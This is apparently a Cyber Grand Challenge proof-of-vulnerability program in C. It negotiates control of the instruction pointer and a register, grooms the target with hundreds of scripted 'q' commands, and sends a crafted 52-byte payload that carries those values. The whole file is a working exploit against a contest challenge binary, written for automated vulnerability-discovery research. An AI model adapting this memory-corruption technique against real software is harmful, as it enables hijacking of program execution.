#include "libpov.h"
#include "cgc_string.h"
#include "cgc__defines.h"

// STOLEN FROM CROMU sample
// itoa - Does not check output buffer size.
// Can potentially cgc_write up to 12 characters ("-2147483648\0") to str.
void cgc_itoa(char *str, int i)
{
    char buffer[11];
    int pos = 0;
    int outpos = 0;
    int neg = 0;
    if (i < 0)
    {
        neg = 1;
        i = -i;
    }
    do
    {
        buffer[pos++] = '0' + i % 10;
        i /= 10;
    } while (i > 0);

    if (neg == 1)
    {
        buffer[pos++] = '-';
    }
    if (str == NULL)
    {
        return;
    }

    while(outpos < pos)
    {
        str[outpos] = buffer[pos - outpos - 1];
        outpos ++;
    }
    str[outpos] = '\0';
}

int main(int cgc_argc, char *cgc_argv[])
{
    char buf[128];
    unsigned char *line;
    unsigned int linesize, i;
    cgc_size_t bytes;
    type1_vals t1;
    cgc_type1_negotiate(0xfefefefe, 0xfefefefe, 5, &t1);
    t1.ipval |= 0x01010101;
    t1.regval |= 0x01010101;

    cgc_transmit_all(STDOUT, "7890\x00\xc0\x47\x43", 8);

    for (i = 0; i < 400; i++)
    {
        int j;
        for (j = 0; j < 23; j++)
        {
            line = NULL;
            cgc_delimited_read(STDIN, &line, &linesize, (unsigned char *)NL, 1);
        }
        buf[0] = 'q';
        buf[1] = NL[0];
        cgc_itoa(&buf[2], i);
        buf[cgc_strlen(buf)] = NL[0];
        buf[cgc_strlen(buf)] = '\0';
        cgc_transmit_all(STDOUT, buf, cgc_strlen(buf));
    }

    cgc_memcpy(buf, "XX\x02""512 aaaabbbbxxxxxxxxxxxxxxxx\x21\x00\x04\x00\x3c\xa8\xaa\xba\x3c\x00\xc0\xb7\x02""512\x02""111\x02", 52);
    *(unsigned int *)&buf[7] = t1.regval;
    *(unsigned int *)&buf[11] = t1.ipval;
    cgc_random(&buf[0], 2, &bytes);
    cgc_random(&buf[15], 16, &bytes);
    for (i = 0; i < 16; i++)
        buf[15 + i] |= 1;
    (void)bytes;
    cgc_transmit_all(STDOUT, buf, 52);
    return 0;
}
